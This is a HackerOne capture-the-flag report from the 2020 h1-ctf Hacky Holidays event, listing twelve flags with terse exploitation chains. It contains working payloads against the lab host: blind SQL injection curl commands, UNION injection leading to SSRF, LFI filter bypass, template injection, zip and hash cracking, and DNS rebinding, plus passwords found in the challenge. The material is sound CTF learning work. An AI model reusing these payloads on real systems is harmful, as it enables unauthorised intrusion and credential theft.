# Stopping Grinch to ruin XMas!

## Report Details
- **Report ID**: 1065485
- **URL**: https://hackerone.com/reports/1065485
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2020-12-23T21:04:27.458Z
- **Disclosed**: 2021-01-11T21:28:58.644Z

## Reporter
- **Username**: nukedx
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
Hello,

Gonna just submit flags first then will send my write up later tomorrow.

## flag1: 
**flag{48104912-28b0-494a-9995-a203d1e261e7}** > https://hackyholidays.h1ctf.com/robots.txt > recon > revealing hidden endpoint

## flag2: 
**flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}** > https://hackyholidays.h1ctf.com/s3cr3t-ar3a > inspect > clear text storage of sensitive data

##flag3: 
**flag{b705fb11-fb55-442f-847f-0931be82ed9a}**  > https://hackyholidays.h1ctf.com/apps > https://hackyholidays.h1ctf.com/people-rater/ > insecure direct object reference > https://hackyholidays.h1ctf.com/people-rater/entry?id=<@base64_1>{"id":1}<@/base64_1>

##flag4: 
**flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}** > https://hackyholidays.h1ctf.com/apps > https://hackyholidays.h1ctf.com/swag-shop/ > improper access control > https://hackyholidays.h1ctf.com/swag-shop/api/sessions > decrypt > https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B202226-FC92EA-1B9043

##flag5: 
**flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}** > https://hackyholidays.h1ctf.com/apps > https://hackyholidays.h1ctf.com/secure-login > lack of rate limiting > username: access, password: computer >cookie alter decode base64 admin to true > zip file > fcrackzip -u -D -p ~/SecLists/Passwords/rockyou.txt my_secure_files_not_for_you.zip > password: hahahaha

##flag6: 
**flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}** > https://hackyholidays.h1ctf.com/apps > https://hackyholidays.h1ctf.com/my-diary/?template=entries.html > local file inclusion > https://hackyholidays.h1ctf.com/my-diary/?template=index.php > replace bypass > https://hackyholidays.h1ctf.com/my-diary/?template=secretadminsecretadminadmin.php.php.php

##flag7: 
**flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}** > https://hackyholidays.h1ctf.com/apps > https://hackyholidays.h1ctf.com/hate-mail-generator > new > server side template injection > intercept > change preview_data name value for: {{template:38dhs_admins_only_header.html}} > https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview

##flag8: 
**flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}** > https://hackyholidays.h1ctf.com/apps > https://hackyholidays.h1ctf.com/forum > github recon > leak of sensitive information > https://github.com/Grinch-Networks/forum > https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae > new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' ); > https://hackyholidays.h1ctf.com/forum/phpmyadmin > 35D652126CA1706B59DB02C93E0C9FBF > md5 crack > BahHumbug > grinch: BahHumbug

##flag9: 
**flag{6e8a2df4-5b14-400f-a85a-08a260b59135}** > https://hackyholidays.h1ctf.com/apps > https://hackyholidays.h1ctf.com/evil-quiz/ > second order sql injection > https://hackyholidays.h1ctf.com/evil-quiz/admin (request=$(curl -X POST https://hackyholidays.h1ctf.com/evil-quiz/ -b "session=9c51f837b45b7d8a94e97438860d3bfb" -d "name=aaa2'+or+(select+1+from+admin+where+MD5(SUBSTRING(password,$1,1))=MD5('$2'))#" -s -w "%{http_code}\n" -o /dev/null)) >admin:S3creT_p4ssw0rd-$ > second order sql injection


##flag10: 
**flag{99309f0f-1752-44a5-af1e-a03e4150757d}** > https://hackyholidays.h1ctf.com/apps > https://hackyholidays.h1ctf.com/signup-manager/ > inspect > https://hackyholidays.h1ctf.com/signup-manager/README.md > https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip > improper input validation > intval 1e3 > gain admin rights

##flag11: 
**flag{07a03135-9778-4dee-a83c-7ec330728e72}** > https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/ > https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=3dir42 > sql injection > https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-2%27+UNION+SELECT+1,NULL,'test'%23 > sql inception > https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-2%27+UNION+SELECT+%22-2%27+UNION+SELECT+1,1,%27../api/user?username=a*%26%27%23%22,NULL,'test'%23 > generate auth for api > ssrf > find endpoints > user > find params > username & password > query api > grinchadmin:s4nt4sucks > https://hackyholidays.h1ctf.com/attack-box

##flag12: 
**flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}** > https://hackyholidays.h1ctf.com/attack-box >  launch attack > decode base64 > hashcat > get salt > mrgrinch463 > create dns entry for rebinding > launch attack > https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709

Thanks for fun!

## Impact

Grinch fails once again!

## Attachments
No attachments
